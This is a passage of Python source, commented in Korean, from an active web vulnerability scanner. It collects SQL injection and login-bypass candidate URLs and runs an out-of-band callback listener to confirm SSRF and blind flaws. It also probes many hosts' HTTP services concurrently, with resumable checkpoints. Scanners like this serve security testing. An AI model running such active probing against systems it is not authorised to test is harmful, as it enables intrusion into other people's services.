        for _p in (points or []):
            if (_p.get("method") or "GET").upper() != "GET" or not _p.get("params"):
                continue
            _u = _p.get("url") or ""
            if _u and "?" not in _u:
                _u = _u + "?" + urllib.parse.urlencode(_p["params"])
            if _u and "?" in _u and _u not in _seen_c:
                _seen_c.add(_u)
                _sqli_cand.append(_u)
        if _sqli_cand:
            findings["_sqli_candidates"] = _sqli_cand[:40]
    except NameError:
        pass  # points 미정의(초기 예외) — 무시
    except Exception:
        pass

    return findings


# ── 배치 오케스트레이터 ───────────────────────────────────────────────────────

# ── 구조 분리(리팩토링) 호환 진입점 ──────────────────────────────────────────
# probes/ 패키지의 orchestrator 로 동일 점검을 수행하는 대체 경로.
# 라이브 스캔은 아래 검증된 probe_http_vulnerabilities/probe_active_for_all_hosts 를 그대로 사용하며,
# 신규 probe 모듈(probes/*_probe.py)은 이 함수들에 위임한다. orchestrator 로의 전면 전환은
# 실제 스캔 검증 후 단계적으로 적용한다(동작 결과 불변 보장 목적).
async def probe_http_vulnerabilities_via_orchestrator(
    host: str, port: int, is_ssl: bool, http_info: dict, cookies: list,
    scan_id: str = "", discovered_urls: list | None = None,
) -> list[dict]:
    """probes.orchestrator 를 통해 점검하고 '레거시 finding 목록'을 반환(호환 진입점)."""
    from probes.orchestrator import run_active_probes_orchestrated
    return await run_active_probes_orchestrated(
        host, port, is_ssl, http_info, cookies,
        scan_id=scan_id, discovered_urls=discovered_urls,
    )


def _collect_login_candidates(service: dict, discovered_urls: list | None) -> list[str]:
    """관리자/로그인 페이지 발견 결과 + 로그인 힌트 URL 을 로그인 점검 후보로 수집."""
    cands: list[str] = []
    seen: set = set()

    def _add(u):
        if u and isinstance(u, str) and u not in seen:
            seen.add(u)
            cands.append(u)

    dr = service.get("discovery_result") or {}
    # 1) admin discovery 의 로그인 폼 보유 페이지(최우선)
    for ah in (dr.get("admin_hits") or []):
        if isinstance(ah, dict) and ah.get("has_login_form"):
            _add(ah.get("url") or ah.get("path"))
    # 2) admin_panel 능동 probe 결과(있으면)
    _ap = service.get("active_probes")
    if isinstance(_ap, dict):
        for fp in ((_ap.get("admin_panel") or {}).get("found_pages") or []):
            if isinstance(fp, dict) and fp.get("has_login_form"):
                _add(fp.get("url"))
    # 3) 로그인 힌트가 있는 발견 URL(상한)
    n = 0
    for u in (discovered_urls or []):
        if isinstance(u, str) and _LOGIN_URL_HINT.search(u):
            _add(u)
            n += 1
            if n >= 10:
                break
    return cands


async def probe_active_for_all_hosts(
    host_results: list[dict],
    max_concurrent: int = 3,
    progress_cb=None,
    scan_id: str = "",
    reset_cov: bool = True,
    skip_keys: set | None = None,
    on_service_done=None,
    log_cb=None,
) -> list[dict]:
    # Phase 2(재개): skip_keys 에 있는 host:port 는 이미 점검됨 → 재점검하지 않고 기존 결과 유지.
    #   on_service_done(key, host_results) 는 각 서비스 점검 완료 시 호출(체크포인트 저장용).
    skip_keys = skip_keys or set()
    """
    모든 호스트의 HTTP 서비스에 대해 능동 취약점 점검을 병렬로 수행합니다.
    각 서비스 딕셔너리에 'active_probes' 키를 추가합니다.
    progress_cb(host, port)는 각 서비스 점검 완료 시 호출됩니다.

    reset_cov=False 이면 커버리지 카운터를 초기화하지 않는다(반복 재점검 라운드에서
    라운드 간 커버리지를 누적하기 위함 — 최초 라운드만 True 로 호출).
    """
    sem = asyncio.Semaphore(max_concurrent)
    if reset_cov:
        reset_coverage(scan_id)   # 점검 커버리지 누산 시작(스캔별)
    _net_reset()   # Phase 3: 네트워크 헬스 카운터 초기화(이 컨텍스트에서 set → 하위 프로브 태스크로 전파)

    # OOB 컬래보레이터 시작(ENABLE_OOB 시) — SSRF/blind 확증용 콜백 리스너(스캔 공유).
    try:
        import oob_collaborator as _oobc
        _c = await _oobc.start_collaborator(scan_id)
        if _c and progress_cb:
            await progress_cb(f"[OOB] 콜백 리스너 시작(포트 {_c.port}) — SSRF/blind 실증 활성")
    except Exception:
        pass

    # 실행 경로 결정: USE_PROBE_ORCHESTRATOR=true 이면 orchestrator 경로 사용,
    # 기본(false)이면 검증된 기존 probe_http_vulnerabilities 경로 사용(라이브 영향 없음).
    try:
        from probes.config import ScanConfig as _ScanConfig
        _use_orchestrator = _ScanConfig.from_env().use_orchestrator
    except Exception:
        _use_orchestrator = False

    def _emit(msg: str):
        """fallback 사유 등 진행 메시지를 로그로 남긴다(progress_cb 의 (host,port) 계약 보존)."""
        print(msg)

    async def _probe_one(host_data: dict, service: dict):
        async with sem:
            port = service.get("port", 0)
            host = host_data["host"]
            _key = f"{host}:{port}"
            # Phase 2: 재개 시 이미 점검 완료된 서비스는 건너뛴다(기존 active_probes 유지).
            if _key in skip_keys and service.get("active_probes") is not None:
                if progress_cb:
                    try:
                        await progress_cb(host, port)
                    except Exception:
                        pass
                return
            is_ssl = bool(service.get("ssl_info")) or port in (443, 8443)
            cookies = (service.get("http_info") or {}).get("cookies", [])
            http_info = service.get("http_info") or {}
            discovered_urls = service.get("discovered_urls")
            # 관리자/로그인 페이지 발견 결과 → 로그인 SQLi/Auth Bypass 후보 입력점으로 연결
            login_candidates = _collect_login_candidates(service, discovered_urls)

            if _use_orchestrator:
                # orchestrator 경로(레거시 finding 목록) → 오류 시 기존 경로로 graceful fallback.
                try:
                    service["active_probes"] = await probe_http_vulnerabilities_via_orchestrator(
                        host, port, is_ssl, http_info, cookies,
                        scan_id=scan_id, discovered_urls=discovered_urls,
                    )
                except Exception as e:
                    _emit(
                        f"[active_probing] orchestrator 경로 실패 — 기존 경로로 fallback "
                        f"({host}:{port}): {e}"
                    )
                    try:
                        service["active_probes"] = await probe_http_vulnerabilities(
                            host, port, is_ssl, http_info, cookies,
                            scan_id=scan_id, discovered_urls=discovered_urls,
                            technologies=host_data.get("technologies"),
                            log_cb=log_cb,
                        )
                    except Exception:
                        service["active_probes"] = {}
            else:
                try:
                    service["active_probes"] = await probe_http_vulnerabilities(
                        host, port, is_ssl, http_info, cookies,
                        scan_id=scan_id, discovered_urls=discovered_urls,
                        login_candidates=login_candidates,
                        technologies=host_data.get("technologies"),
                        log_cb=log_cb,
                    )
                except Exception:
                    service["active_probes"] = {}
            if progress_cb:
                try:
                    await progress_cb(host_data["host"], port)
                except Exception:
                    pass
            # Phase 2: 이 서비스 점검 완료 → 체크포인트 저장(재개 시 이 서비스는 건너뜀)
            if on_service_done:
                try:
                    await on_service_done(_key, host_results)
                except Exception:
                    pass

    tasks = [
        _probe_one(hd, svc)
        for hd in host_results
        for svc in hd.get("services", [])
        if svc.get("http_info")
    ]
    try:
        if tasks:
            _gres = await asyncio.gather(*tasks, return_exceptions=True)
            # 네트워크 죽음 신호는 gather 에 캡처되므로 여기서 재전파(→ run_scan 이 interrupted 처리)
            for _r in _gres:
                if isinstance(_r, ScanInterrupted):
                    raise _r
    finally:
        # OOB 컬래보레이터 정리(리스너 종료) — 예외 경로 포함 항상 수행.
        try:
            import oob_collaborator as _oobc
            await _oobc.stop_collaborator(scan_id)
        except Exception:
            pass

    return host_results
